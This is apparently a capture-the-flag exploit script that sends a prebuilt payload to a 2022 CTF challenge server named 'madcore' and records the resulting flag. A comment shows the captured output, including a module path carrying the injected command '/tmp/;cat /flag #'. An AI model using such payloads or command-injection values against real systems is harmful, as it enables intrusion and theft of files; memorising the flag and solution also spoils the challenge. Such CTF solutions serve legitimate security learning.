#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './pwn'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'madcore.2022.ctfcompetition.com', 'port':1337})
env.select()

#==========

def attack(conn, **kwargs):
    exploit = open('core_flag', 'rb').read()
    input('>')
    conn.send(exploit)
    conn.shutdown('send')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # {"backtrace":[[0,"<unknown>"],[0,""],[0,"CTF{w4y_cpp_g0tta_be_like_that_can_we_get_a_good_STLPLS}\n"]],"modules":["/tmp/;cat /flag #","/usr/lib/x86_64-linux-gnu/ld-2.31.so"]}

if __name__=='__main__':
    main()

#==========
